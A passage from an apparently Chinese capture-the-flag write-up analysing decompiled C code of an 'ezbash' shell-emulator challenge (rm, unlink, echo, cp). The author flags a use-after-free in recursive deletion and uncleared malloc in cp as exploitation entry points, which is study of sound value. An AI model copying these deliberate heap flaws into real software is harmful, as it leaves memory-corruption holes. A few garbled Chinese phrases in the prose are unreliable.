class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> ( !checkfolder(file) )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ezbash -r: cannot remove &#x27;%s&#x27;: Is a file\n&quot;</span>, cmd[v3]);</span><br><span class="line">              <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">memset</span>(file-&gt;name, <span class="number">0</span>, <span class="keyword">sizeof</span>(file-&gt;name));</span><br><span class="line">            file-&gt;futher = <span class="number">0LL</span>;</span><br><span class="line">            <span class="keyword">if</span> ( file-&gt;firstson )</span><br><span class="line">            &#123;</span><br><span class="line">              ptr = file-&gt;firstson;</span><br><span class="line">              <span class="keyword">do</span></span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span> ( ptr-&gt;context )</span><br><span class="line">                  <span class="built_in">free</span>(ptr-&gt;context);</span><br><span class="line">                <span class="built_in">free</span>(ptr);                      <span class="comment">// uaf</span></span><br><span class="line">                                                <span class="comment">// </span></span><br><span class="line">                ptr = ptr-&gt;next_bro;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">while</span> ( ptr );</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">          &#125;</span><br><span class="line">          file = file-&gt;next_bro;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      &#125;</span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;                                           <span class="comment">// 删除单文件</span></span><br><span class="line">                                                <span class="comment">// </span></span><br><span class="line">                                                <span class="comment">// </span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( file )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(file-&gt;name, cmd[v3]) )</span><br><span class="line">        &#123;</span><br><span class="line">          v2 = <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">if</span> ( checkfile(file) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">memset</span>(file-&gt;name, <span class="number">0</span>, <span class="keyword">sizeof</span>(file-&gt;name));</span><br><span class="line">            <span class="keyword">if</span> ( file-&gt;context )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">free</span>(file-&gt;context);</span><br><span class="line">              file-&gt;context = <span class="number">0LL</span>;              <span class="comment">// 没有uaf</span></span><br><span class="line">            &#125;</span><br><span class="line">LABEL_14:</span><br><span class="line">            unlink(file);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ezbash: &#x27;%s&#x27;: Is a directory\n&quot;</span>, cmd[v3]);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        file = file-&gt;next_bro;</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_26:</span><br><span class="line">      <span class="keyword">if</span> ( v2 != <span class="number">1</span> )</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ezbash: &#x27;%s&#x27;: No such file or directory\n&quot;</span>, cmd[v3]);</span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">    </span><br><span class="line">  <span class="type">void</span> __fastcall <span class="title function_">unlink</span><span class="params">(file *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1-&gt;next_bro )</span><br><span class="line">    a1-&gt;next_bro-&gt;prev_bro = a1-&gt;prev_bro;</span><br><span class="line">  <span class="keyword">if</span> ( a1-&gt;prev_bro )</span><br><span class="line">    a1-&gt;prev_bro-&gt;next_bro = a1-&gt;next_bro;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    cuurr_pos-&gt;firstson = a1-&gt;next_bro;</span><br><span class="line">  a1-&gt;next_bro = <span class="number">0LL</span>;</span><br><span class="line">  a1-&gt;prev_bro = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">free</span>(a1);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
<p>只可以堆当前目录的对象进行操作。当删除的目录下有子目录 x，不会破坏 x 的子文件链表结构，这里看似存在 uaf 名单时册灰姑娘徐每次创建 file 都会清空，所以无法利用。checkfile 以及 checkfolder 分别检查对象是文件还是文件夹。-r 不可删除文件。unlink 的操作也没有什么问题，</p>
<h4 id="echo"><a class="markdownIt-Anchor" href="#echo">#</a> echo</h4>
<p>echo 支持两种操作，一个是将内容直接输出，一个是根据倒数第二个参数是否为 “-&gt;” 决定，不是，就直接输出，否则，就会将数据写进指定的 file。强调，一定是倒数第二参数。其他一律认为是内容，字符串不存在空格，是写进 context 的时候额外加入的。另外，echo 不可以将空字符写入。而且也不会在</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">aecho</span><span class="params">(<span class="type">char</span> **cmd)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> size; <span class="comment">// rax</span></span><br><span class="line">  file *v3; <span class="comment">// rbx</span></span><br><span class="line">  file *v4; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">size_t</span> v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+14h] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+14h] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">int</span> chunksize; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">  <span class="type">int</span> textlen; <span class="comment">// [rsp+1Ch] [rbp-34h]</span></span><br><span class="line">  <span class="type">int</span> argv_nums; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  file *file; <span class="comment">// [rsp+28h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *filename; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v14; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v14 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( cmd[<span class="number">1</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      ++v6;</span><br><span class="line">    <span class="keyword">while</span> ( cmd[v6] );</span><br><span class="line">    argv_nums = v6 - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( tofile(cmd[v6 - <span class="number">2</span>]) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt; argv_nums; ++i )</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s &quot;</span>, cmd[i]);</span><br><span class="line">      <span class="built_in">puts</span>(cmd[argv_nums]);</span><br><span class="line">      result = <span class="number">1LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;                                           <span class="comment">// 写入文件</span></span><br><span class="line">      file = cuurr_pos-&gt;firstson;</span><br><span class="line">      filename = cmd[argv_nums];</span><br><span class="line">      <span class="keyword">if</span> ( findfile(&amp;file, filename) != <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ezbash: %s: No such file\n&quot;</span>, filename);</span><br><span class="line">        result = <span class="number">1LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( checkfile(file) )               <span class="comment">// 检查是否为文件</span></span><br><span class="line">      &#123;</span><br><span class="line">        textlen = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( file-&gt;context )                    <span class="comment">// 已经写过了</span></span><br><span class="line">        &#123;</span><br><span class="line">          size = get_chunk_size(file-&gt;context);</span><br><span class="line">          <span class="built_in">memset</span>(file-&gt;context, <span class="number">0</span>, size);       <span class="comment">// 清空</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">1</span>; j &lt; argv_nums - <span class="number">1</span>; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( file-&gt;context )</span><br><span class="line">          &#123;</span><br><span class="line">            chunksize = get_chunk_size(file-&gt;context);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span>                                  <span class="comment">// 空的，申请</span></span><br><span class="line">          &#123;</span><br><span class="line">            chunksize = <span class="number">0x150</span>;</span><br><span class="line">            v3 = file;</span><br><span class="line">            v3-&gt;context = <span class="built_in">malloc</span>(<span class="number">0x150</span>uLL);</span><br><span class="line">            <span class="built_in">memset</span>(file-&gt;context, <span class="number">0</span>, <span class="number">0x150</span>uLL);</span><br><span class="line">          &#125;</span><br><span class="line">          textlen += <span class="built_in">strlen</span>(cmd[j]) + <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">while</span> ( textlen &gt;= chunksize )</span><br><span class="line">            chunksize += <span class="number">0x150</span>;</span><br><span class="line">          <span class="keyword">if</span> ( chunksize &gt; get_chunk_size(file-&gt;context) )</span><br><span class="line">          &#123;</span><br><span class="line">            v4 = file;</span><br><span class="line">            v4-&gt;context = <span class="built_in">realloc</span>(file-&gt;context, chunksize);</span><br><span class="line">          &#125;</span><br><span class="line">          v5 = <span class="built_in">strlen</span>(cmd[j]);</span><br><span class="line">          <span class="built_in">strncat</span>(file-&gt;context, cmd[j], v5);</span><br><span class="line">          <span class="keyword">if</span> ( j &lt; argv_nums - <span class="number">2</span> )</span><br><span class="line">            *(file-&gt;context + <span class="built_in">strlen</span>(file-&gt;context)) = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        result = <span class="number">1LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ezbash: %s: Is a directory\n&quot;</span>, filename);</span><br><span class="line">        result = <span class="number">1LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    result = <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Orphan comments:</span></span><br><span class="line"><span class="comment">stdout</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p>每次 echo，都会清空 context 的内容，而且是跟据 chunksize 清空的。并且如果写的数据大于等于 chunksize-2 就会把 context 调大。而且注意。</p>
<h4 id="cp"><a class="markdownIt-Anchor" href="#cp">#</a> cp</h4>
<p>整个程序攻击的开始就是在 cp，cp 可以拷贝当前目录下的文件，一个是把他的内容拷贝到当前目录下的另一个文件里，起一个是拷贝到子文件夹下的文件里，如果指定的文件不存在，会自动创建。但是佟阿姨那个调用的是 calloc40，所以没有 uaf。问题在于对 context 的复制，目标文件没有 context 指针，会申请一个，重点来了，这里用的是 malloc，而且不会清空。如果我们要拷贝的文件没有 context，会把对应的目标文件的 context     free。或者直接创建一个新的空文件。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">acp</span><span class="params">(<span class="type">char</span> **cmd)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">void</span> *v2; <span class="comment">// rsp</span></span><br><span class="line">  __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">size_t</span> v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6[<span class="number">3</span>]; <span class="comment">// [rsp+8h] [rbp-B0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> **comment; <span class="comment">// [rsp+20h] [rbp-98h]</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// [rsp+29h] [rbp-8Fh]</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// [rsp+2Ah] [rbp-8Eh]</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// [rsp+2Bh] [rbp-8Dh]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-8Ch]</span></span><br><span class="line">  <span class="type">int</span> nums; <span class="comment">// [rsp+30h] [rbp-88h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [rsp+34h] [rbp-84h]</span></span><br><span class="line">  file *<span class="built_in">list</span>; <span class="comment">// [rsp+38h] [rbp-80h] BYREF</span></span><br><span class="line">  file *destination; <span class="comment">// [rsp+40h] [rbp-78h] BYREF</span></span><br><span class="line">  file *copied_file; <span class="comment">// [rsp+48h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *s1; <span class="comment">// [rsp+50h] [rbp-68h]</span></span><br><span class="line">  file *curops; <span class="comment">// [rsp+58h] [rbp-60h]</span></span><br><span class="line">  file *ptr; <span class="comment">// [rsp+60h] [rbp-58h]</span></span><br><span class="line">  __int64 v20; <span class="comment">// [rsp+68h] [rbp-50h]</span></span><br><span class="line">  <span class="type">char</span> *dest; <span class="comment">// [rsp+70h] [rbp-48h]</span></span><br><span class="line">  file *curr; <span class="comment">// [rsp+78h] [rbp-40h]</span></span><br><span class="line">  file *temp; <span class="comment">// [rsp+80h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> delim[<span class="number">2</span>]; <span class="comment">// [rsp+8Eh] [rbp-2Ah] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v25; <span class="comment">// [rsp+90h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  comment = cmd;</span><br><span class="line">  v25 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">list</span> = cuurr_pos-&gt;firstson;</span><br><span class="line">  curops = cuurr_pos;</span><br><span class="line">  destination = cuurr_pos-&gt;firstson;</span><br><span class="line">  copied_file = <span class="number">0LL</span>;</span><br><span class="line">  ptr = <span class="number">0LL</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(delim, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    ++i;</span><br><span class="line">  <span class="keyword">while</span> ( comment[i] );</span><br><span class="line">  nums = i - <span class="number">1</span>;</span><br><span class="line">  v13 = <span class="built_in">strlen</span>(comment[i - <span class="number">1</span>]);</span><br><span class="line">  v20 = v13 + <span class="number">1</span> - <span class="number">1LL</span>;</span><br><span class="line">  v6[<span class="number">0</span>] = v13 + <span class="number">1</span>;</span><br><span class="line">  v6[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v1 = <span class="number">16</span> * ((v6[<span class="number">0</span>] + <span class="number">15</span>) / <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="keyword">while</span> ( v6 != (v6 - (v1 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL)) )</span><br><span class="line">    ;</span><br><span class="line">  v2 = alloca(v1 &amp; <span class="number">0xFFF</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (v1 &amp; <span class="number">0xFFF</span>) != <span class="number">0</span> )</span><br><span class="line">    *(&amp;v6[<span class="number">-1</span>] + (v1 &amp; <span class="number">0xFFF</span>)) = *(&amp;v6[<span class="number">-1</span>] + (v1 &amp; <span class="number">0xFFF</span>));</span><br><span class="line">  dest = v6;</span><br><span class="line">  <span class="keyword">if</span> ( nums == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ezbash: missing destination file operand after &#x27;%s&#x27;\n&quot;</span>, comment[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, comment[nums]);</span><br><span class="line">  <span class="keyword">for</span> ( s1 = strtok(dest, delim); ; s1 = strtok(<span class="number">0LL</span>, delim) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !s1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt; nums; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        copied_file = curops-&gt;firstson;</span><br><span class="line">        v9 = findfile(&amp;copied_file, comment[i]);</span><br><span class="line">        <span class="keyword">if</span> ( v9 != <span class="number">1</span> || !checkfile(copied_file) )<span class="comment">// 未找到 ，或者不是个文件</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ezbash: cannot stat &#x27;%s&#x27;: No such file or directory\n&quot;</span>, comment[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;                                       <span class="comment">// 索引最后一个file</span></span><br><span class="line">          destination = cuurr_pos-&gt;firstson;</span><br><span class="line">          v8 = findfile(&amp;destination, comment[i]);</span><br><span class="line">          <span class="keyword">if</span> ( v8 )</span><br><span class="line">          &#123;</span><br><span class="line">            copy(copied_file, destination);     <span class="comment">// 文件复制到其他位置</span></span><br><span class="line">            cuurr_pos = curops;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            curr = cuurr_pos-&gt;firstson;</span><br><span class="line">            temp = calloc40();</span><br><span class="line">            temp-&gt;flag = <span class="number">1</span>;</span><br><span class="line">            copy_name(temp, copied_file-&gt;name);</span><br><span class="line">            <span class="keyword">if</span> ( copied_file-&gt;context )</span><br><span class="line">              copycontext(copied_file, temp);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">              temp-&gt;context = <span class="number">0LL</span>;</span><br><span class="line">            <span class="keyword">if</span> ( curr )</span><br><span class="line">              link(curr, temp);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">              cuurr_pos-&gt;firstson = temp;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      cuurr_pos = curops;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s1, <span class="string">&quot;.&quot;</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">LABEL_32:</span><br><span class="line">    ;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, off_4077) )</span><br><span class="line">  &#123;</span><br><span class="line">    cuurr_pos = cuurr_pos-&gt;futher;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_32;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">list</span> = cuurr_pos-&gt;firstson;</span><br><span class="line">  v10 = findfile(&amp;<span class="built_in">list</span>, s1);</span><br><span class="line">  <span class="keyword">if</span> ( nums &gt; <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v10 != <span class="number">1</span> || !checkfolder(<span class="built_in">list</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ezbash: target &#x27;%s&#x27; is not a directory\n&quot;</span>, comment[nums]);</span><br><span class="line">      cuurr_pos = curops;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cuurr_pos = <span class="built_in">list</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_32;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( nums != <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_32;</span><br><span class="line">  v4 = v13;</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(s1);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(&amp;dest[v4 - v5], s1) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_32;</span><br><span class="line">  copied_file = curops-&gt;firstson;</span><br><span class="line">  destination = curops-&gt;firstson;</span><br><span class="line">  v9 = findfile(&amp;copied_file, comment[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( v9 != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ezbash: cannot stat &#x27;%s&#x27;: No such file or directory\n&quot;</span>, comment[<span class="number">1</span>]);</span><br><span class="line">    cuurr_pos = curops;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !checkfile(copied_file) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ezbash: -r not specified; omitting directory &#x27;%s&#x27;\n&quot;</span>, comment[<span class="number">1</span>]);</span><br><span class="line">    cuurr_pos = curops;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v8 = findfile(&amp;destination, s1);</span><br><span class="line">  <span class="keyword">if</span> ( v8 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( checkfolder(destination) )</span><br><span class="line">    &#123;</span><br><span class="line">      cuurr_pos = destination;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span 